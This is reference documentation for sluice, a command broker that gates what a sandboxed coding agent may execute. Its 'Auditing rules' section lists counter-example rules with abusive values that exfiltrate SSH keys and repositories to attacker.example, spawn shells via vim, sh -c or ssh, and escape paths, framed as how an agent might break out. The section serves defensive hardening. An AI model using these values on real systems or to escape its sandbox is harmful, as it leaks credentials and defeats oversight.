# sluice reference

Complete syntax and semantics. For an introduction and tutorial, see
[README.md](README.md).

- [Rule file syntax](#rule-file-syntax)
- [`defaults:` attributes](#defaults-attributes)
- [Per-rule attributes](#per-rule-attributes)
- [Slot system](#slot-system)
- [Path templates](#path-templates)
- [Audit](#audit)
- [Log policy](#log-policy)
- [`exec_path`](#exec_path)
- [Wire protocol](#wire-protocol)
- [CLI](#cli)
- [Error codes](#error-codes)
- [Auditing rules](#auditing-rules)
- [Production checklist](#production-checklist)

---

## Rule file syntax

Line-oriented, whitespace-significant.

- `;` starts a comment to end of line. On rule lines it is
  quote-aware: a `;` inside a single- or double-quoted literal is data,
  not a comment.
- Attribute values: if the value starts with `'` or `"`, it is one
  shell-quoted word (so `1 = '^a;b$'` keeps the `;`; prefer single
  quotes for regexes, since a backslash inside `"…"` escapes the next
  character). Otherwise quotes are ordinary characters, and `;` starts a
  comment unless written `\;`.
- Blank lines separate stanzas; otherwise meaningless.
- An **unindented** line is a stanza header — either the literal
  `defaults:` or a *rule line*.
- An **indented** line (any leading whitespace) is an attribute of the
  preceding stanza, written `key = value`.

A rule line is a literal command line, tokenised shell-style:

- Whitespace separates tokens.
- `'…'` and `"…"` quote a token (the quotes don't appear in the
  matched argument).
- `\x` escapes the next byte inside a `"…"` literal or anywhere outside
  quotes.
- The first token is the executable. Bare names go through
  [`exec_path`](#exec_path) at call time. Absolute paths must start
  with `/`.
- Subsequent tokens are either *literals* or *slots* (see
  [Slot system](#slot-system)).

Example:

```
defaults:
  timeout = 30s
  env     = HOME,PATH,LANG

git --no-pager -C /srv/mirror/project log --oneline -n #1
  1 = ^[1-9][0-9]?$

/bin/sh -c 'set -e; date; uptime'      ; quoted ';' is literal
```

---

## `defaults:` attributes

All attributes are optional. Defaults marked **(default-strict)** matter
when `audit = strict` (which is itself the default).

| attribute    | scope            | default                                | summary                                              |
|--------------|------------------|----------------------------------------|------------------------------------------------------|
| `timeout`    | defaults + rule  | (none)                                 | Wall-clock kill (`SIGTERM` then `SIGKILL` after 2s)  |
| `cwd`        | defaults + rule  | broker's cwd                           | Child working directory                              |
| `env`        | defaults + rule  | `none`                                 | Environment allowlist                                |
| `log`        | defaults + rule  | `full`                                 | Verbosity policy for the audit manifest              |
| `logfile`    | defaults only    | (none)                                 | JSONL audit manifest path                            |
| `stdoutfile` | defaults + rule  | (none)                                 | Per-call raw stdout sidecar path template            |
| `stderrfile` | defaults + rule  | (none)                                 | Per-call raw stderr sidecar path template            |
| `audit`      | defaults only    | `strict`                               | What to do on audit failure                          |
| `exec_path`  | defaults + rule  | `/bin:/usr/bin:/sbin:/usr/sbin`        | Bare-name executable lookup path                     |

`cwd`, `logfile`, `stdoutfile`, and `stderrfile` accept `$HOME` and
`$XDG_RUNTIME_DIR`; see
[Environment-variable expansion](#environment-variable-expansion).

### `timeout = <duration>`

Wall-clock cap on the spawned child. The child is `setpgid`'d into its
own process group; on timeout the broker `killpg`s the group with
`SIGTERM`, waits 2 seconds, then `SIGKILL`s — so most grandchildren are
caught too.

Format: `<n>(ms|s|m|h)`. Bare number = seconds.

```
timeout = 30s
timeout = 5m
timeout = 250ms
```

When the timeout fires, the wire reply is `ERR_TIMEOUT` (-7), whatever
the child's own exit, and `sluicify` exits 124 (as GNU `timeout`). The
manifest exit event records `"timed_out":true`, the elapsed time, and
the killing signal.

The timeout also bounds output capture under `stdoutfile`/`stderrfile`:
relays stop at timeout + 2 s even if a background process still holds
the pipe. A process that left the group with `setsid` is not killed.

### `cwd = <path>`

Absolute path. Child `chdir`s here just before `execve`. If the path
doesn't exist or isn't traversable, the child exits 126 immediately.
Accepts `$HOME` / `$XDG_RUNTIME_DIR` (see
[Environment-variable expansion](#environment-variable-expansion)).

### `env = <policy>`

Allowlist of environment variables inherited from the broker. Two
forms:

- `env = none` — empty environment (besides what `exec_path` injects;
  see below).
- `env = NAME1,NAME2,…` — these names are inherited from the broker if
  they're set; missing ones are simply omitted.

Variable names must match `^[A-Z_][A-Z0-9_]*$`-ish (alphanumeric +
underscore, not starting with a digit). Bad names are rejected at parse
time.

`PATH` is special: the value injected by [`exec_path`](#exec_path)
overrides any `PATH` produced by `env` allowlisting.

### `log = full | argv-only | exit-only`

Controls what the audit manifest records and whether stdio is teed.
See [Log policy](#log-policy) for full semantics.

### `logfile = <path-template>`

Path to the JSONL audit manifest. **Defaults level only** — there's
one shared manifest. The path is opened once at startup (and re-opened
on `SIGHUP`).

Path can contain system slots, but per-call slots (`#$call`) don't
make sense here — operators wanting per-call audit use
`stdoutfile`/`stderrfile`. Useful slots in the manifest path: `#$ts`
for daily-stamped manifests, or none. Also accepts `$HOME` /
`$XDG_RUNTIME_DIR` (see [Environment-variable expansion](#environment-variable-expansion)).

Created with mode `0600`. The parent dir must be owner-only and
non-writable to others (the broker rejects open if the parent is
group/world-writable). `O_NOFOLLOW` rejects symlink races at the leaf.

### `stdoutfile`, `stderrfile = <path-template>`

Per-call raw stdio capture. The bytes are byte-identical to what the
child wrote — no UTF-8 decode, no buffering, no escaping. Standard
tools (`cat`, `grep`, `jq`, `tail -f`) work directly.

Templates support all [system slots](#path-templates) plus `$HOME` /
`$XDG_RUNTIME_DIR` (see [Environment-variable expansion](#environment-variable-expansion)).
Use `#$call` (or `#$ts_ms`) to ensure each call lands in a unique
file.

Same hardening as `logfile` (mode 0600, `O_NOFOLLOW`, owner-only
parent).

When neither `stdoutfile` nor `stderrfile` is set, sluice uses the
**direct** spawn path — caller's fds are `dup2`'d straight onto the
child's 0/1/2, no userspace copy. When at least one is set, sluice
interposes pipes and runs relay threads to tee.

Either way the reply goes out when the direct child exits, as with a
shell. If a background process the child started still holds stdout or
stderr, the reply waits at most 200 ms for it. The relays then keep
capturing its output until it closes the pipe, or, if the rule has a
`timeout`, until timeout + 2 s. The call keeps its broker slot until the
capture ends, and the manifest exit event is written then, with
`"drain_timeout":true` if capture was cut at the deadline.

### `audit = strict | best-effort`

How the broker reacts to audit failure. See [Audit](#audit) for the
full matrix.

### `exec_path = <colon-list> | inherit`

Where bare-name rules look up the executable. See
[`exec_path`](#exec_path).

---

## Per-rule attributes

Each rule's stanza accepts the same attributes as `defaults:` (with the
`logfile` exception), plus per-slot regexes.

```
journalctl --user --no-pager -u app.service -n #count
  count = ^[1-9][0-9]{0,3}$   ; per-slot regex (named slot #count)
  timeout = 5s                ; rule override
  env     = HOME,LANG         ; rule override
  stdoutfile = /home/agent/.local/state/sluice/journal/c#$call.out
```

### Per-slot regex

Indented lines whose key is a slot identifier (a number `1..N` or a
named slot like `count`) attach a regex constraint to that slot. The
regex is **anchored implicitly** — sluice always wraps it as
`^(?:…)$`, so every branch of an alternation like `main|develop` must
match the whole value. Your own `^`/`$` are harmless but redundant.

Slot values exceeding 4 KB are rejected unconditionally.

**Every slot needs a regex**, unless it is listed in `allow_any`. A slot
with neither is a parse error.

**Values starting with `-` are refused** on every slot, even when the
regex matches, unless the slot is listed in `allow_dash`. Programs read
a leading `-` as an option, and options such as `git log
--output=<file>` or `rsync -e <cmd>` do far more than the positional
value the rule author had in mind. The usual "safe" class
`^[A-Za-z0-9._/-]+$` accepts `-o/etc/x`, so the regex alone can't be
relied on for this. A refusal is logged with reject reason
`option_like`, and `sluice match` explains it.

### `allow_dash = <slot>[, <slot>…]` and `allow_any = <slot>[, <slot>…]`

Explicit, per-rule widening, one or more slot names (`1`, `count`, or
`#count`):

| slot declared with      | value is checked against                        |
|-------------------------|-------------------------------------------------|
| regex                   | the regex, and must not start with `-`          |
| regex + `allow_dash`    | the regex only                                  |
| `allow_any` (no regex)  | nothing but the 4 KB cap                        |

```
sort #opt #file
  opt  = ^-[rn]$
  file = ^[a-z]+\.txt$
  allow_dash = opt

logger -t agent -- #msg     ; after `--`, the value is message text
  allow_any = msg
```

Contradictions are parse errors: a regex on an `allow_any` slot, a slot
in both lists, `allow_dash` on a slot without a regex, or a slot the
rule doesn't have. `sluice check` lists every `allow_any` and
`allow_dash` slot so a reviewer sees all widening in one place.

### Reserved attribute names

The keys `timeout`, `cwd`, `env`, `log`, `logfile`, `stdoutfile`,
`stderrfile`, `exec_path`, `allow_dash`, `allow_any` cannot be used as
named slots. Use a
different slot name.

---

## Slot system

A slot is a token of the form `#<id>` where `<id>` is either:

- a positive integer `#1`, `#2`, … — *numeric slot*
- an alphanumeric identifier `#path`, `#unit`, `#dst` — *named slot*

Slots can only be **whole tokens** — a slot inside a literal string
(e.g. `s3://#bucket/key`) is not parsed as a slot. Wrap the whole token
as a slot instead and constrain it via regex.

A rule cannot have two slots with the same id.

Caller-supplied values are filled positionally; arity is checked
exactly (the rule's token count must equal `argv.len() - 1`).

---

## Path templates

The values for `logfile`, `stdoutfile`, `stderrfile` are *path
templates* — strings with `#$<system-slot>` placeholders substituted
at call time.

| slot      | resolves to                                    |
|-----------|------------------------------------------------|
| `#$call`  | broker monotonic call id (1, 2, …)             |
| `#$pid`   | caller pid (`SO_PEERCRED`)                     |
| `#$uid`   | caller uid                                     |
| `#$rule`  | matched rule's line number in the rules file   |
| `#$ts`    | unix epoch seconds at call start               |
| `#$ts_ms` | unix epoch milliseconds at call start          |

Unknown slots are rejected at parse time. To put a literal `#$` in a
path, use a different naming scheme — there's no escape.

A path containing `#$call` (or `#$ts_ms`) is unique per call.
Concurrent appends to the same resolved path are still serialised
through a per-path mutex, so non-unique paths (e.g.
`~/.local/state/sluice/by-pid/#$pid.log`) are safe — sequential calls
from the same pid concatenate cleanly.

### Environment-variable expansion

Path-shaped fields — `logfile`, `stdoutfile`, `stderrfile`, and `cwd`
(in both `defaults:` and per-rule blocks) — expand a tightly
allowlisted set of environment variables **once at parse time** (and
again on every `SIGHUP` reload):

| token                  | source                                     |
|------------------------|--------------------------------------------|
| `$HOME` / `${HOME}`    | broker process's `$HOME`                   |
| `$XDG_RUNTIME_DIR` / `${XDG_RUNTIME_DIR}` | broker's `$XDG_RUNTIME_DIR` |

Anything else (`$PATH`, `$USER`, `$FOO`, …) is **rejected at parse
time** with `unsupported variable $… (only $HOME and $XDG_RUNTIME_DIR
are allowed)`. Typos like `$HOMW` fail loudly rather than silently
landing audit data in a literal `$HOMW` directory. An allowlisted var
that is unset (e.g. `$XDG_RUNTIME_DIR` under cron) is also a parse
error, not an empty splice.

The expansion uses the **broker's** environment, not the caller's —
the rules file is the audit source of truth, not per-call state. For
a per-user broker this is irrelevant; for a system broker it's the
correct posture.

Expansion happens before `#$slot` substitution, so the two compose:

```
stdoutfile = $HOME/.local/state/sluice/c#$call.out
; → /home/alice/.local/state/sluice/c42.out  (call #42)
```

A lone `$` not followed by an identifier or `{` stays literal.
`${HOME` (unterminated brace) is a parse error.

---

## Audit

`audit = strict` (default) refuses to operate when the configured audit
can't be honored. `audit = best-effort` downgrades to warnings.

| condition                                                | strict                    | best-effort               |
|----------------------------------------------------------|---------------------------|---------------------------|
| Socket parent dir writable by another uid                | refuse start              | warn + start              |
| `logfile` path is a symlink                              | refuse open               | refuse open               |
| `logfile` parent group/world-writable                    | refuse open               | refuse open               |
| `logfile` initial open fails (perms, ENOSPC, …)          | refuse start              | refuse start              |
| `stdoutfile`/`stderrfile` open fails at call time        | reject call (`ERR_AUDIT`) | log + run with no sink    |
| `stdoutfile`/`stderrfile` parent unsafe                  | reject call               | log + run                 |
| Manifest start event write fails (mid-run, transient)    | reject call               | log + run                 |
| Manifest already-unhealthy on next call                  | reject call               | log + run                 |
| Sink write fails mid-call                                | mark unhealthy + `truncated:true` on exit; **next** call refused | log to stderr; `truncated:true` on exit |
| Manifest exit / reject event write fails                 | log to stderr             | log to stderr             |

The "manifest already-unhealthy" check uses an internal flag that
flips false on any write/flush failure (manifest or sink) and never
recovers without `SIGHUP` (which constructs a fresh `Logger` for the
same path).

A failed sink write does **not** count toward `stdout_bytes` /
`stderr_bytes` — those reflect what's on disk, not what was
attempted. The exit event additionally carries `"truncated":true`
when at least one sink lost bytes during the call:

```jsonl
{"call":7,"ts":...,"kind":"exit","status":0,"duration_ms":42,
 "stdout_bytes":1024,"stderr_bytes":0,"truncated":true}
```

Find them with `jq 'select(.truncated)'`. The field is omitted on
clean calls to keep common-case lines shorter.

The start event's `"resolved"` is the binary actually executed, after
[`exec_path`](#exec_path) lookup; `argv[0]` is only what the caller
sent. The exit event's `status` is the wire status; it adds
`"signal":N` when the child was killed by a signal and
`"timed_out":true` when the rule's timeout fired (both omitted
otherwise).

`duration_ms` measures the direct child. When output capture was cut at
the rule's timeout + 2 s while a background process still held the
pipe, the exit event carries `"drain_timeout":true` (also omitted when
false).

---

## Log policy

Three levels controlling what enters the manifest. Independent of, and
in addition to, sink configuration.

| `log =`     | `start` event | `exit` event | stdio tee'd to sinks? |
|-------------|---------------|--------------|------------------------|
| `full`      | yes (with argv) | yes        | yes (if sinks set)     |
| `argv-only` | yes (with argv) | yes        | **no** (sinks ignored) |
| `exit-only` | **no**          | yes        | **no** (sinks ignored) |

`exit-only` is the most-redacted mode: the manifest records `{call,
ts, kind:"exit", status, duration_ms, stdout_bytes:0, stderr_bytes:0}`
with no argv. Useful when argv may carry secrets you don't want
captured but you still need an audit trail of "this call happened".

Reject events are emitted in all three modes (a denied call is
security-relevant); argv is suppressed under `exit-only` only.

---

## `exec_path`

Where bare-name rules resolve to an absolute path. Resolution happens
in the broker (Rust code) — `execve` is then called with the absolute
path, so an attacker on the broker's `PATH` can't redirect lookup.

### Default

```
exec_path = /bin:/usr/bin:/sbin:/usr/sbin
```

These are root-owned and not user-writable on a normal Linux system.

### Custom list

```
exec_path = /opt/agent/bin:/usr/local/bin:/bin:/usr/bin
```

Each entry must be an absolute path. Empty entries (e.g. a stray
trailing `:`) and relative entries are rejected at parse time — both
expose the executable resolution to the caller's CWD.

### `inherit`

```
exec_path = inherit
```

Use the broker process's `PATH` at exec time. Useful for development;
discouraged in production because it pulls operator habits (custom
PATH entries) into the broker's threat model.

### Per-rule override

A rule can override `exec_path` for its own lookup:

```
deploy #env
  env = ^(staging|prod)$
  exec_path = /opt/deploy/bin
```

### Effect on the child's environment

The resolved path is also written into the child's `PATH` env var
(overriding any `PATH` produced by `env` allowlisting), so any sub-shell
spawned by the child sees the same lookup path as sluice used.

---

## Wire protocol

Transport: `AF_UNIX` `SOCK_SEQPACKET`. One request, one reply. Both
fit in a single message — no length-prefixed reassembly.

### Request

The caller sends one message containing the payload below, with three
fds (stdin, stdout, stderr) attached as `SCM_RIGHTS` ancillary data.

```
u32 magic        = 0x534C4358   ("SLCX", little-endian)
u32 version      = 1
u32 argv_count   ; 1..=256
for each arg:
    u32  byte_len    ; 0..=16384
    u8[byte_len]     ; UTF-8, no embedded NUL

ancillary: SCM_RIGHTS = [stdin_fd, stdout_fd, stderr_fd]
```

Maximum total payload: 1 MiB.

### Reply

```
u32 magic        = 0x534C4358
u32 version      = 1
i32 status
```

Status interpretation:

| value                  | meaning                                                 |
|------------------------|---------------------------------------------------------|
| `0..=255`              | child's exit code; `128 + signo` if killed by a signal  |
| `-1` (`ERR_NO_RULE`)   | no rule matched (regex, arity, or option-like value)    |
| `-2` (`ERR_PROTO`)     | protocol error or recv timeout                          |
| `-3` (`ERR_FDS`)       | wrong fd count (≠ 3 attached)                           |
| `-4` (`ERR_SPAWN`)     | fork/exec failed                                        |
| `-6` (`ERR_AUDIT`)     | audit refused under strict mode                         |
| `-7` (`ERR_TIMEOUT`)   | rule `timeout` fired; child was killed                  |
| `-8` (`ERR_PEER`)      | caller's `SO_PEERCRED` unreadable                       |

`-5` is no longer sent; signal deaths are `128 + signo`.

The bundled clients (`sluicify`, `sluicify.py`, `sluicify.js`) exit
124 on `ERR_TIMEOUT` and `128 + |status|` on other negative statuses,
so shell pipelines can branch on them.

### See also

`src/proto.rs` is the canonical spec — short, unit-tested.

---

## CLI

### `sluice check <rules-file>`

Parse the file and report rule count and exe shape per rule. Then list
every slot widened with `allow_any` or `allow_dash`, and warn about a
regex that only matches values starting with `-` on a slot not in
`allow_dash` (it can never match). Returns 0 on success, 1 on parse
error; notes and warnings don't change the exit code.

```sh
$ sluice check ~/.config/sluice/agent.rules
ok: 5 rule(s)
  line  10: BareName("git")  tokens=4  slots=1
  ...
```

### `sluice match <rules-file> <argv...>`

Match an argv against the rules without running anything. Returns 0
and prints the matching rule and slot bindings, or 1 if no match.

```sh
$ sluice match ~/.config/sluice/agent.rules gh pr view 42 -R example-org/project --json number,title,state,url
match: rule at line 17
  #number = "42"
```

### `sluice serve --rules <file> --socket <path>`

Run the broker. Both flags are required; both should be absolute paths.

The broker:

- Refuses to start if the socket parent dir is writable by another uid
  (under strict; warns under best-effort).
- Removes a stale socket *file* (one that refuses connections), but
  refuses to start if another broker is listening there or if the path
  is not a socket.
- Binds with `umask 0077` so the socket file is mode 0600.
- `SIGHUP` → reload rules + reopen manifest + clear sink cache.
- Exits with code 2 on configuration error, runs forever otherwise.

#### User-level systemd unit (laptop / dev workstation)

`~/.config/systemd/user/sluice.service`:

```ini
[Unit]
Description=sluice — coding agent broker

[Service]
Type=simple
ExecStart=%h/.local/bin/sluice serve \
    --rules  %h/.config/sluice/agent.rules \
    --socket %t/sluice/agent.sock
Restart=on-failure

[Install]
WantedBy=default.target
```

Then `systemctl --user enable --now sluice`. No system-level
privileges, no root, no dedicated uid. (`%h` = `$HOME`,
`%t` = `$XDG_RUNTIME_DIR`.)

#### System-level systemd unit (multi-tenant / shared host)

When the broker must run as a separate uid (CI runners, shared
servers), use a system unit at `/etc/systemd/system/sluice.service`:

```ini
[Unit]
Description=sluice command broker for the agent sandbox
After=network.target

[Service]
Type=simple
User=agent
Group=agent
ExecStart=/usr/local/sbin/sluice serve \
    --rules  /etc/sluice/agent.rules \
    --socket /var/lib/sluice/agent.sock
Restart=on-failure
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/sluice /var/log/sluice
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

The `agent` uid, `/etc/sluice/`, `/var/lib/sluice/`, and
`/var/log/sluice/` must all exist with mode 0700, owned by
`agent:agent`. See the [Production checklist](#production-checklist).

---

## Error codes

See [Wire protocol](#wire-protocol) for the negative status codes
returned by the broker. Process exit codes from the bundled clients
follow the convention `128 + |sluice_error|`:

| broker status | sluicify exit code | meaning                       |
|---------------|--------------------|-------------------------------|
| `0`           | `0`                | child exited 0                |
| `1..=255`     | `1..=255`          | child's exit code (`128 + signo` if killed by a signal) |
| `-1`          | `129`              | no matching rule              |
| `-2`          | `130`              | protocol error / recv timeout |
| `-3`          | `131`              | wrong fd count                |
| `-4`          | `132`              | spawn failure                 |
| `-6`          | `134`              | audit refused (strict)        |
| `-7`          | `124`              | rule timeout fired            |
| `-8`          | `136`              | caller identity unreadable    |

---

## Auditing rules

**sluice checks the shape of an argv. It does not understand the
program it runs.** A rule grants everything that program can be made
to do with any value your regexes accept, any bytes on stdin, and any
file the caller can write — running as the broker's uid, outside the
sandbox. That set is almost always larger than the one command you had
in mind, and the gap rarely shows from reading the rule. Rules that
look the most harmless are often the dangerous ones: the risk is in
the program, not in the slots.

Audit every rule as if the caller were trying to escape, because a
compromised or misled caller will. The patterns below are how rules
leak; each one has been missed by careful people.

**Every rule in the tables below is a counter-example — do not copy
it.** Each shows a rule that looks reasonable, a value or file that
gets through, and what it costs.

### 1. A rule with no slots is not automatically safe

The program can take its instructions from somewhere other than argv.

| Rule | What the caller controls | Result |
|---|---|---|
| `python3` | stdin is the program | arbitrary code |
| `sqlite3 /srv/app/data.db` | stdin is CLI input; `.shell` and `.system` run commands | arbitrary code |
| `make -C /work test` | `/work/Makefile`, when the caller can write `/work` | arbitrary code |
| `git -C /work status` | `/work/.git/config` (`core.fsmonitor`, `core.pager`, filters) and `/work/.git/hooks/` | arbitrary code |
| `npm install` in `/work` | `package.json` install scripts | arbitrary code |
| `git -C /srv/repo log` | nothing writable — but when the caller's stdout is a terminal, git starts a pager, and `less` runs `!command` | arbitrary code |

Stdin is passed through untouched and is not constrained by any rule.
Any program that reads code, commands or configuration from stdin, from
its working directory, or from files the caller can write, is a
code-execution grant. For the pager case, put the program's no-pager
flag in the rule (`git --no-pager log …`).

### 2. The program reads options and directives out of values

sluice refuses slot values starting with `-` unless the slot is in
`allow_dash`. That covers getopt-style options only. Programs have
other ways to turn a value into an instruction:

| Rule | Value | Result |
|---|---|---|
| `curl -d #data https://api.example.com/notes` | `@/home/user/.ssh/id_ed25519` | uploads the private key (`@` means "read this file") |
| `vim #file` | `+!sh` | runs a shell (`+` is an ex command) |
| `cc #src -o /work/out` | `@/work/args.txt` | reads further arguments from a file the caller wrote |
| `tar -xf #archive -C /work` | an archive with `../` or absolute member paths, or symlinks | writes outside `/work` |

Read the program's manual for every syntax a positional value can
take, not just its flags. Every `allow_dash` and `allow_any` reopens
the option surface for that slot on purpose — `sluice check` lists them
so each one is a visible decision.

### 3. Something downstream parses the arguments again

Some programs hand their arguments to another interpreter. Then the
regex has to rule out that interpreter's syntax too, and that is
nearly impossible for free text.

| Rule | Why |
|---|---|
| `ssh backup.example.net du -sh #dir` | ssh joins its arguments into one command line for the remote login shell: `;`, `$(…)`, quotes and globs are shell syntax on the far side |
| `sh -c #script`, `bash -c …`, `su -c …` | the slot *is* shell code |
| `find /srv -name #pattern -exec …`, `xargs …`, `env …`, `timeout 30 #cmd`, `nice …`, `watch …` | the slot ends up in a command position |
| `docker exec app #arg`, `kubectl exec …` | a second argv crosses another boundary with its own parsing |

The fix is to keep caller-composed text off the command line: send it
on stdin to a program that reads data from stdin, and keep argv to
values a strict regex pins down (`^[a-z][a-z0-9-]{0,40}$`).

### 4. Paths escape the place the regex seems to name

| Rule and regex | Value that matches | Result |
|---|---|---|
| `tar -czf /backups/out.tgz #dir`, `dir = ^[a-z0-9/._-]+$` | `../../home/user` | archives your home |
| same | `/etc` | absolute paths match too |
| `cat #file`, `file = ^reports/[a-z0-9_.-]+$` | `reports/latest` where the caller made `latest` a symlink | reads anything the broker can |

Anchor paths to a fixed prefix, forbid `..` (leave `.` out of the class
or require `^[a-z0-9_-]+(/[a-z0-9_-]+)*$`), and remember a regex sees
the string, never what is on disk: a path inside a directory the caller
can write can be a symlink to anywhere.

### 5. The regex is looser than it reads

- `.` matches any character except newline, and `.*` / `.+` accept
  nearly everything: they are `allow_any` with extra steps.
- `[\x20-\x7e]` (printable ASCII) includes `;`, `|`, `&`, `$`, quotes,
  backticks and `>`.
- `\d`, `\w` and `\s` are Unicode-aware: `\d` matches non-ASCII digits,
  `\w` matches letters from every script, `\s` matches newline. Spell
  out ASCII classes (`[0-9]`, `[A-Za-z0-9_]`) or put `(?-u)` in front.
- A class with `-` in it (`[A-Za-z0-9._/-]`) is fine for the middle of a
  value; sluice's leading-dash refusal is what keeps it from being an
  option — so `allow_dash` on such a slot reopens it.

Test each regex against the worst value you can construct, with
`sluice match`, before you trust it.

### 6. A value names where data goes, and the child holds credentials

The child inherits what `env` passes through and everything the
broker's uid can read: `$HOME` with its tokens, `SSH_AUTH_SOCK`, cloud
credentials. A slot that picks a *destination* turns that into
exfiltration, with no code execution needed.

| Rule | Value | Result |
|---|---|---|
| `git -C /work push #remote main` | `https://attacker.example/x.git` | the repository leaves |
| `curl -T /work/report.pdf #url` | any URL | the file leaves |
| `rsync -a /work/ #dst` with `env = SSH_AUTH_SOCK` | `attacker.example:loot/` | the tree leaves, authenticated as you |

Fix destinations in the rule as literals. Pass a credential through
`env` only to a rule whose every argument is fixed or pinned.

### 7. Rules combine

Audit the rule *set*, not each rule. Two rules that are each harmless
can compose into one that is not.

```
tee /home/user/.config/app/config.toml     ; caller writes the file via stdin
systemctl --user restart app               ; ...then makes it take effect
```

Together they let the caller run `app` with any configuration, and
every option `app` reads from its config becomes reachable. Look for
any rule whose output — a file, a directory, a git ref — another rule
reads, executes or loads.

### Per-rule procedure

For every rule, before it goes live:

1. Read the program's manual end to end: options, every syntax a
   positional value accepts, subcommands, configuration it reads (from
   the working directory, `$HOME`, the repository), environment it
   honours, programs it starts (pagers, editors, hooks, plugins,
   helpers), and where it can send data.
2. For each slot, write down the worst value the regex accepts and try
   it with `sluice match`.
3. For the rule as a whole, list what it reads that the caller can
   write: stdin, its `cwd`, files in writable directories.
4. Check what the child receives: `env` passthrough, the broker uid's
   files and sockets.
5. Check it against every other rule (pattern 7).
6. If a rule is a code-execution grant on purpose — running a test
   suite the caller wrote, for instance — say so in a comment above it,
   and run the broker as a dedicated unprivileged uid that holds
   nothing worth taking. The regex can't make such a rule safe; only the
   broker's identity can bound it.

Audit again whenever a rule is added or changed, the invoked program is
upgraded (new options, new config keys), the caller gains a writable
path, or the broker's uid or environment changes. Then read the
manifest: `reject` events are a caller probing the edges, and accepted
`argv` values show what the rules are really being used for.

---

## Production checklist

This list is for **multi-tenant / shared-host deployment** — sluice
running as a dedicated system uid serving sandboxes belonging to
other users or to the system. For single-user laptop / dev-workstation
deployment, the checklist collapses to: follow the
[README tutorial](README.md), and the user-land paths (`~/.config/sluice/`,
`~/.local/state/sluice/`, `$XDG_RUNTIME_DIR/sluice/`) handle the perms
correctly without further ceremony.

For shared-host deployment, before going live, verify:

- [ ] Broker runs as a dedicated **unprivileged** user. Never run as root.
- [ ] Socket parent dir owned by that user, mode `0700` (e.g.
      `/var/lib/sluice` owned `agent:agent`).
- [ ] Audit dirs (`logfile` parent and any `stdoutfile`/`stderrfile`
      ancestor) owned by the broker user, mode `0700` (e.g.
      `/var/log/sluice`).
- [ ] Rules file owned by the broker user, mode `0600` or `0640` (e.g.
      `/etc/sluice/agent.rules`).
- [ ] `exec_path` is **explicit** (not `inherit`). The default is good
      for most cases.
- [ ] `audit = strict` (the default — don't change without a reason).
- [ ] Every rule has been through the
      [per-rule procedure](#per-rule-procedure), and every `allow_any`
      and `allow_dash` entry in the `sluice check` output is intended.
- [ ] Rules are tested with `sluice check` and a representative set of
      `sluice match` invocations.
- [ ] `logrotate` configured for the manifest. Sluice reopens on
      `SIGHUP`; standard `postrotate { kill -HUP $MAINPID }` works.
- [ ] System-level systemd unit (or equivalent) restarts the broker on
      crash. `Restart=on-failure` + `NoNewPrivileges=true`. See the
      [System-level systemd unit](#system-level-systemd-unit-multi-tenant--shared-host)
      example.
- [ ] If the sandbox technology supports it, also set seccomp
      filters/landlock on the broker process — sluice has no business
      calling `mount`, `ptrace`, etc.
- [ ] The bind-mount of the socket into the sandbox should be the
      *only* path between the two; verify nothing else leaks (no
      shared `/tmp`, no inherited fds).

### Threats sluice does NOT mitigate

- A child process that legitimately backgrounds work outliving its
  parent (e.g. `nohup`, `disown`). Timeout-driven kill catches the
  process tree it spawned, but a child that intentionally `setsid`s to
  detach escapes `killpg`. Use cgroup containment if your threat model
  requires this.
- Co-resident attackers who can write to ancestors of the audit
  directory (e.g. `/var/log` is group-writable to a group you share).
  The broker checks the *immediate* parent only; full ancestor walk
  via `openat2(RESOLVE_NO_SYMLINKS|RESOLVE_BENEATH)` is not
  implemented. Pin your audit ancestry to root-owned dirs.
- Kernel exploits, container escapes, and side channels in the
  binaries the rules invoke. sluice is a policy gate — once a rule
  fires, the binary's own behavior is what you trust.
